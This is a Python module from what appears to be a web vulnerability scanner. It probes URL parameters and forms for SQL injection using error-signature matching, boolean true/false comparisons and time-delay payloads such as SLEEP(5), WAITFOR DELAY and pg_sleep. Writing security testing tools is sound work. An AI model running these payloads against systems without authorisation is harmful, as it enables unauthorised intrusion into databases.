import re
import secrets
import statistics
import time
from difflib import SequenceMatcher
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import requests

from config import *
from core.banner import info, success, warning, vuln, found, make_table
from core.http import RateLimitedSession


SQL_ERRORS = [
    
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "mysqli_", "mysql_fetch", "mysql_num_rows", "mysql_query", "mysql_real_escape_string",
    
    "pg_query", "pg_exec", "unterminated quoted string", "postgresql",
    "valid postgresql result", "pg_connect",
    
    "microsoft ole db provider for sql server", "odbc sql server driver",
    "unclosed quotation mark after the character string", "sqlserver",
    
    "ora-00933", "ora-00921", "ora-01756", "ora-01789", "oracle error",
    "quoted string not properly terminated",
    
    "sqlite3", "sqlite_exception", "sqlite::",
    
    "unclosed quotation mark", "sql command not properly ended",
    "supplied argument is not a valid", "division by zero",
]


class SQLiModule:
    def __init__(self, target: str, console, params=None, forms=None, baseline=None,
                 surface=None, intrusive: bool = False):
        self.target = target
        self.console = console
        self.params = params or []
        self.forms = forms or []
        self.baseline = baseline
        self.surface = surface
        self.intrusive = intrusive
        self.session = RateLimitedSession()
        self.vulnerabilities = []
        self.tested = 0
        self.skipped_budget = 0
        self._baseline_cache = {}

    @staticmethod
    def _normalise_body(body: str) -> str:
        """Remove common per-request noise before differential comparison."""
        body = str(body or "")[:8192]
        body = re.sub(r"\b[0-9a-f]{8}-[0-9a-f-]{27,}\b", "<uuid>", body, flags=re.I)
        body = re.sub(r"\b\d{10,}\b", "<number>", body)
        body = re.sub(r"\s+", " ", body).strip()
        return body

    @classmethod
    def _similarity(cls, left: str, right: str) -> float:
        return SequenceMatcher(None, cls._normalise_body(left), cls._normalise_body(right),
                               autojunk=True).ratio()

    @staticmethod
    def _compatible(responses) -> bool:
        statuses = {getattr(r, "status_code", None) for r in responses}
        ctypes = {
            str(getattr(r, "headers", {}).get("Content-Type", "")).split(";", 1)[0].lower()
            for r in responses
        }
        return len(statuses) == 1 and len(ctypes) <= 1

    def _record_injection(self, count=1):
        if self.surface and hasattr(self.surface, "record_injection"):
            self.surface.record_injection("sqli", count)

    def _measure_url(self, url: str, injection=False):
        if injection:
            self._record_injection()
        start = time.monotonic()
        try:
            self.session.get(url, timeout=15)
            return time.monotonic() - start, False
        except requests.exceptions.Timeout:
            return 15.0, True

    def _check_errors(self, body: str) -> str:
        body_lower = body.lower()
        for err in SQL_ERRORS:
            if err in body_lower:
                return err
        return ""

    def _baseline_body(self, url: str) -> str:
        if url not in self._baseline_cache:
            try:
                self._baseline_cache[url] = self.session.get(url, timeout=TIMEOUT).text
            except Exception:
                self._baseline_cache[url] = ""
        return self._baseline_cache[url]

    def test_error_based(self, url: str, param: str):
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        for payload in SQLI_PAYLOADS[:10]:
            try:
                test_params = dict(base_params)
                test_params[param] = payload
                query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, ""))

                self._record_injection()
                resp = self.session.get(test_url, timeout=TIMEOUT)
                self.tested += 1

                if self.baseline is not None and self.baseline.classify(resp) == "catchall":
                    continue

                error_sig = self._check_errors(resp.text)
                if error_sig:
                    base_body = self._baseline_body(url).lower()
                    if error_sig in base_body:
                        continue

                    self.vulnerabilities.append({
                        "url": url, "param": param, "type": "Error-Based",
                        "payload": payload, "evidence": error_sig,
                    })
                    vuln(self.console, f"SQLi (Error Verified) @ {param} | Payload: {payload}")
                    return True
            except Exception:
                continue
        return False


    def test_boolean_based(self, url: str, param: str):
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        try:
            def injected(value):
                params = dict(base_params)
                params[param] = value
                query = urlencode(params, doseq=True)
                return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, ""))

            true_url = injected("1' AND '1'='1")
            false_url = injected("1' AND '1'='2")
            control_url = injected("kripto-control-" + secrets.token_hex(6))
            baselines, truths, falses, controls = [], [], [], []
            for _ in range(2):
                baselines.append(self.session.get(url, timeout=TIMEOUT))
                self._record_injection(3)
                truths.append(self.session.get(true_url, timeout=TIMEOUT))
                falses.append(self.session.get(false_url, timeout=TIMEOUT))
                controls.append(self.session.get(control_url, timeout=TIMEOUT))
                self.tested += 3

            all_responses = baselines + truths + falses + controls
            if not self._compatible(all_responses):
                return False
            if self.baseline is not None and all(
                    self.baseline.classify(r) == "catchall" for r in truths + falses):
                return False

            reference = baselines[0].text
            base_consistency = min(self._similarity(reference, r.text) for r in baselines)
            true_scores = [self._similarity(reference, r.text) for r in truths]
            false_scores = [self._similarity(reference, r.text) for r in falses]
            control_scores = [self._similarity(reference, r.text) for r in controls]

            
            
            if (base_consistency >= 0.97 and min(true_scores) >= 0.95 and
                    min(control_scores) >= 0.90 and max(false_scores) <= 0.82 and
                    min(true_scores) - max(false_scores) >= 0.15):
                self.vulnerabilities.append({
                    "url": url, "param": param, "type": "Boolean-Based",
                    "payload": "1' AND '1'='1 vs 1' AND '1'='2",
                    "evidence": (f"repeatable similarity split: true={min(true_scores):.2f}, "
                                 f"false={max(false_scores):.2f}, "
                                 f"control={min(control_scores):.2f}"),
                })
                vuln(self.console, f"SQLi (Boolean) @ {param} | repeatable content split")
                return True
        except Exception:
            pass
        return False

    def test_time_based(self, url: str, param: str):
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)
        time_payloads = [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)#",
            "1; SELECT pg_sleep(5)--",
        ]

        for payload in time_payloads:
            try:
                test_params = dict(base_params)
                test_params[param] = payload
                query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, ""))

                baseline_samples, probe_samples = [], []
                probe_timeouts = 0
                for _ in range(2):
                    base_elapsed, base_timeout = self._measure_url(url)
                    if base_timeout:
                        warning(self.console, "Baseline timed out; time-based SQLi is inconclusive.")
                        return False
                    elapsed, probe_timeout = self._measure_url(test_url, injection=True)
                    baseline_samples.append(base_elapsed)
                    probe_samples.append(elapsed)
                    probe_timeouts += int(probe_timeout)
                    self.tested += 1

                base_median = statistics.median(baseline_samples)
                probe_median = statistics.median(probe_samples)
                deltas = [probe - base for probe, base in zip(probe_samples, baseline_samples)]
                if min(deltas) >= 4.0 and (probe_timeouts == 0 or probe_timeouts == 2):
                    self.vulnerabilities.append({
                        "url": url, "param": param, "type": "Time-Based",
                        "payload": payload,
                        "evidence": (f"Repeated delay: median {probe_median:.1f}s vs "
                                     f"baseline {base_median:.1f}s; deltas "
                                     f"{', '.join(f'{d:.1f}s' for d in deltas)}"),
                    })
                    vuln(self.console, f"SQLi (Time-Based) @ {param} | repeated delay")
                    return True
            except Exception:
                continue
        return False

    def test_form(self, form: dict):
        action = form.get("action", self.target)
        method = form.get("method", "GET").upper()
        if method != "GET" and not self.intrusive:
            return False
        inputs = form.get("inputs", [])

        try:
            base_body = self._baseline_body(action).lower()
        except Exception:
            base_body = ""

        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue

            for payload in SQLI_PAYLOADS[:8]:
                try:
                    data = {}
                    for i in inputs:
                        if i["name"] == name:
                            data[i["name"]] = payload
                        else:
                            data[i["name"]] = i.get("value", "test")

                    if method == "POST":
                        self._record_injection()
                        resp = self.session.post(action, data=data, timeout=TIMEOUT)
                    else:
                        self._record_injection()
                        resp = self.session.get(action, params=data, timeout=TIMEOUT)
                    self.tested += 1

                    error_sig = self._check_errors(resp.text)
                    if error_sig and error_sig not in base_body:
                        self.vulnerabilities.append({
                            "url": action, "param": f"form:{name}", "type": "Error-Based (Form)",
                            "payload": payload, "evidence": error_sig,
                        })
                        vuln(self.console, f"SQLi (Form) @ {name} | {error_sig[:50]}")
                        return True
                except Exception:
                    continue
        return False

    def _targets(self):
        """Prefer the shared attack surface so parameters mined from JS bundles
        and confirmed by differential probing get tested too."""
        if self.surface:
            return self.surface.injection_targets()
        return self.params

    def run(self) -> dict:
        targets = self._targets()
        info(self.console, f"Testing SQLi: {len(targets)} params, {len(self.forms)} forms...")

        if not targets and not self.forms:
            warning(
                self.console,
                "No URL parameters or forms were discovered - SQL injection testing was NOT performed.",
            )

        for p in targets:
            url = p.get("url", self.target)
            param = p.get("param", "")
            if not param:
                continue

            if "?" not in url:
                url = f"{url}?{param}=1"

            info(self.console, f"Testing param: {param} (source: {p.get('source', 'crawl')})")
            if not self.test_error_based(url, param):
                if not self.test_boolean_based(url, param):
                    if self.intrusive:
                        self.test_time_based(url, param)

        for form in self.forms[:50]:
            self.test_form(form)

        success(self.console, f"SQLi scan complete: {len(self.vulnerabilities)} found, {self.tested} tests")

        if self.vulnerabilities:
            rows = [(v["param"], v["type"], v["payload"][:40], v["evidence"][:40]) for v in self.vulnerabilities]
            self.console.print(make_table("SQL Injection Vulnerabilities", ["Param", "Type", "Payload", "Evidence"], rows))

        total_known = len(self.surface.params()) if self.surface else len(self.params)
        return {
            "vulnerable_params": self.vulnerabilities,
            "tested_count": self.tested,
            "params_considered": len(targets),
            "uncovered_params": max(0, total_known - len(targets)),
            "time_based_enabled": self.intrusive,
        }
